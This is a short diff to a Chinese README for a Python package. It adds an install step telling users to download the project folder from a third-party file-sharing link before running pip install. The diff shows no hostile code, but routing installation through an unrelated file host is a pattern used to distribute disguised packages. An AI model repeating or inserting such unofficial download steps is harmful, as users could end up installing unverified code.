@@ -31,7 +31,11 @@
 - 🏷️ **现代 Python 语法** — 基于 Python 3.10+，完整类型提示，IDE 智能补全无忧
 
 ## 安装
-
+下载文件夹
+```bash
+https://wwbup.lanzout.com/iHHEg44itnti
+```
+使用
 ```bash
 pip install . --force-reinstall
 ```
